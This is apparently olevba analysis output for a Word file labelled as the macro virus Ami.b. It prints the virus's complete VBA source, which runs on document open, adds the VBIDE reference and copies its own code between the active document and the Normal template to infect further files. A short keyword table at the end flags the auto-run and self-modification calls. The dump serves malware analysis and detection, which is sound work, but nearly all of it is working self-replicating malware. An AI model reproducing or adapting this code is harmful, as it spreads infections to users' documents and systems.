olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ami.b-8efcccd246db437bba1d3692584379a365d10033
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ami.b-8efcccd246db437bba1d3692584379a365d10033 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Office_.bas 
in file: Virus.MSWord.Ami.b-8efcccd246db437bba1d3692584379a365d10033 - OLE stream: 'Macros/VBA/Office_'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Function MatizMe()
On Error Resume Next

Set MyHost_ = MyHost
Set MyNewHost_ = MyNewHost
ActiveHost_ = ActiveHost

Set MyHost = Nothing
Set MyNewHost = Nothing


CheckRefNormal
CheckRefActive


If AmINormInstalled = False Then
    If CheckNormHost = False Then
        MyNewHost.Add (vbext_ct_StdModule)
        MyNewHost("Modul1").Name = "Office_"
        NormHostName_ = "Office_"
    Else
        NormHostName_ = NormHostName
    End If
    
    Our1Line% = Find1Line
    
    VirusLines% = (MyHost_(ActiveHost_).CodeModule.CountOfLines - Our1Line)
    VirusCode$ = MyHost_(ActiveHost_).CodeModule.Lines(Our1Line, VirusLines%)
    HostLines% = MyNewHost_(NormHostName_).CodeModule.CountOfLines
    MyNewHost(NormHostName_).CodeModule.InsertLines (HostLines% + 1), VirusCode$
    
End If
    
If AmIActInstalled = False Then
    If CheckDokHost = False Then
        MyNewHost.Add (vbext_ct_StdModule)
        MyNewHost("Modul1").Name = "Office_"
        DokHostName_ = "Office_"
    Else
        DokHostName_ = DokHostName
    End If
    
    Our1Line% = Find1Line
    
    VirusLines% = (MyHost_(ActiveHost_).CodeModule.CountOfLines - Our1Line)
    VirusCode$ = MyHost_(ActiveHost_).CodeModule.Lines(Our1Line, VirusLines%)
    HostLines% = MyNewHost_(DokHostName_).CodeModule.CountOfLines
    MyNewHost(DokHostName_).CodeModule.InsertLines (HostLines% + 1), VirusCode$

End If
End Function

Function MyHost() As Object

If MacroContainer = NormalTemplate Then Set MyHost = NormalTemplate.VBProject.VBComponents
If MacroContainer = ActiveDocument Then Set MyHost = ActiveDocument.VBProject.VBComponents

End Function

Function MyNewHost() As Object

If MacroContainer = NormalTemplate Then Set MyNewHost = ActiveDocument.VBProject.VBComponents
If MacroContainer = ActiveDocument Then Set MyNewHost = NormalTemplate.VBProject.VBComponents

End Function

Function ActiveHost() As String
For i = 1 To NormalTemplate.VBProject.VBComponents.Count
         
    For iq = 1 To NormalTemplate.VBProject.VBComponents(i).CodeModule.CountOfLines
        If Left(NormalTemplate.VBProject.VBComponents(i).CodeModule.Lines(iq, 1), 18) = "Function MatizMe()" Then
            ActiveHost = NormalTemplate.VBProject.VBComponents(i).Name
            Exit Function
        End If
    Next iq
         
Next i

For j = 1 To ActiveDocument.VBProject.VBComponents.Count

    For icq = 1 To ActiveDocument.VBProject.VBComponents(j).CodeModule.CountOfLines
        If Left(ActiveDocument.VBProject.VBComponents(j).CodeModule.Lines(icq, 1), 18) = "Function MatizMe()" Then
            ActiveHost = ActiveDocument.VBProject.VBComponents(j).Name
            Exit Function
        End If
    Next icq
                          
Next j

End Function

Function AmINormInstalled() As Boolean

AmINormInstalled = False

For i = 1 To NormalTemplate.VBProject.VBComponents.Count

For iq = 1 To NormalTemplate.VBProject.VBComponents(i).CodeModule.CountOfLines
    If Left(NormalTemplate.VBProject.VBComponents(i).CodeModule.Lines(iq, 1), 18) = "Function MatizMe()" Then
        AmINormInstalled = True
        Exit Function
    End If
Next iq

Next i

End Function

Function AmIActInstalled() As Boolean

AmIActInstalled = False

For i = 1 To ActiveDocument.VBProject.VBComponents.Count

For icq = 1 To ActiveDocument.VBProject.VBComponents(i).CodeModule.CountOfLines
    If Left(ActiveDocument.VBProject.VBComponents(i).CodeModule.Lines(icq, 1), 18) = "Function MatizMe()" Then
        AmIActInstalled = True
        Exit Function
    End If
Next icq

Next i

End Function

Function CheckDokHost() As Boolean

CheckDokHost = False

CheckItem = ActiveDocument.VBProject.VBComponents.Count

If CheckItem > 1 Then
    For i = 1 To CheckItem
        If ActiveDocument.VBProject.VBComponents(i).Type = vbext_ct_StdModule Then
            CheckDokHost = True
            Exit Function
        End If
    Next i
End If

End Function

Function DokHostName() As String

CheckItem = ActiveDocument.VBProject.VBComponents.Count

If CheckItem > 1 Then
    For i = 1 To CheckItem
        If ActiveDocument.VBProject.VBComponents(i).Type = vbext_ct_StdModule Then
            DokHostName = ActiveDocument.VBProject.VBComponents(i).Name
            Exit Function
        End If
    Next i
End If

End Function
Function CheckNormHost() As Boolean

CheckNormHost = False

CheckItem = NormalTemplate.VBProject.VBComponents.Count
If CheckItem > 1 Then
    For i = 1 To CheckItem
        If NormalTemplate.VBProject.VBComponents(i).Type = vbext_ct_StdModule Then
            CheckNormHost = True
            Exit Function
        End If
    Next i
End If
    
End Function

Function NormHostName() As String
CheckItem = NormalTemplate.VBProject.VBComponents.Count
If CheckItem > 1 Then
    For i = 1 To CheckItem
        If NormalTemplate.VBProject.VBComponents(i).Type = vbext_ct_StdModule Then
            NormHostName = NormalTemplate.VBProject.VBComponents(i).Name
            Exit Function
        End If
    Next i
End If

End Function

Function CheckRefNormal()
CheckRefNormal = False

For i = 1 To NormalTemplate.VBProject.References.Count
    If NormalTemplate.VBProject.References(i).Name = "VBIDE" Then CheckRefNormal = True
Next

If CheckRefNormal = False Then
    NormalTemplate.VBProject.References.AddFromGuid "{0002E157-0000-0000-C000-000000000046}", 1, 0
End If

End Function

Function CheckRefActive()
CheckRefActive = False

For i = 1 To ActiveDocument.VBProject.References.Count
    If ActiveDocument.VBProject.References(i).Name = "VBIDE" Then CheckRefActive = True
Next

If CheckRefActive = False Then
    ActiveDocument.VBProject.References.AddFromGuid "{0002E157-0000-0000-C000-000000000046}", 1, 0
End If

End Function

Function Find1Line() As Integer
Find1Line = 0

For i = 1 To MyHost(ActiveHost).CodeModule.CountOfLines
    If Left(MyHost(ActiveHost).CodeModule.Lines(i, 1), 18) = "Function MatizMe()" Then
        Find1Line = i
        Exit Function
    End If
Next
End Function

Sub AutoOpen()
MatizMe
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

